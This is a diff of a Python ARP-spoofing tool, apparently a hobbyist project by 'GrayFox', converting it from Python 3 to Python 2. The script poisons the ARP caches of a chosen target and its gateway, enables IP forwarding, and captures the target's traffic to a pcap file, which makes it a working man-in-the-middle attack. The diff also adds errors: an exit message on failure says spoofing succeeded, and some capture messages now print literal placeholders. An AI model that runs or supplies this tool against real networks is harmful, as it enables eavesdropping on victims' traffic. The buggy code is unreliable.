@@ -1,13 +1,16 @@
-#ARPSPOOFING 
+#ARPSPOOFING2.0
 #Author: GrayFox 
 #For team Cypher
-#usr/env/python3 
+#usr/env/python2
 print ("""
- ____  ____  ____  ____ 
-/  _ \/  __\/  __\/ ___\
-| / \||  \/||  \/||    \
-| |-|||    /|  __/\___ |
-\_/ \|\_/\_\\_/   \____/
+ $$$$$$\  $$$$$$$\  $$$$$$$\   $$$$$$\  
+$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
+$$ /  $$ |$$ |  $$ |$$ |  $$ |$$ /  \__|
+$$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$\  
+$$  __$$ |$$  __$$< $$  ____/  \____$$\ 
+$$ |  $$ |$$ |  $$ |$$ |      $$\   $$ |
+$$ |  $$ |$$ |  $$ |$$ |      \$$$$$$  |
+\__|  \__|\__|  \__|\__|       \______/ 2.0
 Made By GrayFox""")
 #Importations 
 import sys, os, time
@@ -22,9 +25,9 @@ os.system ("arp -a")
 os.system ("arp -n")
 print ("The arp spoofing is a ilicit action, please don't make anything ilegal")
 os.system ("sleep 7")
-target = input("Chosse IP>>>")
-tunnel = input("chosse the tunnel>>>")
-packet = input("Chosse the number of packets to send>>>")
+target = raw_input("Chosse IP>>>")
+tunnel = raw_input("chosse the tunnel>>>")
+packet = raw_input("Chosse the number of packets to send>>>")
 
 #ARP Poison parameters
 gateway_ip = tunnel
@@ -71,22 +74,22 @@ print("[*] Starting script: ARPS.py")
 print("[*] Enabling IP forwarding")
 #Enable IP Forward on a MAC
 os.system("sysctl -w net.inet.ip.forwarding=1")
-print(f"[*] Gateway IP: {gateway_ip}")
-print(f"[*] Target IP: {target_ip}")
+print("[*] Gateway IP:"+tunnel)
+print("[*] Target IP:"+target)
 
 gateway_mac = get_mac(gateway_ip)
 if gateway_mac is None:
-    print("[!] Unable to get gateway MAC address. Exiting..")
+    print("[!] Unable to get gateway MAC address. Exiting..In the same way, spoofing has been succesfull")
     sys.exit(0)
 else:
-    print(f"[*] Gateway MAC address: {gateway_mac}")
+    print("[*] Gateway MAC address:"+gateway_mac)
 
 target_mac = get_mac(target_ip)
 if target_mac is None:
     print("[!] Unable to get target MAC address. Exiting..")
     sys.exit(0)
 else:
-    print(f"[*] Target MAC address: {target_mac}")
+    print("[*] Target MAC address:"+target_mac)
 
 #ARP poison thread
 poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
@@ -95,12 +98,12 @@ poison_thread.start()
 #Sniff traffic
 try:
     sniff_filter = "ip host " + target_ip
-    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
+    print("[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
     packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
     wrpcap(target_ip + "_capture.pcap", packets)
-    print(f"[*] Stopping network capture..Restoring network")
+    print("[*] Stopping network capture..Restoring network")
     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 except KeyboardInterrupt:
-    print(f"[*] Stopping network capture..Restoring network")
+    print("[*] Stopping network capture..Restoring network")
     restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
 sys.exit(0)
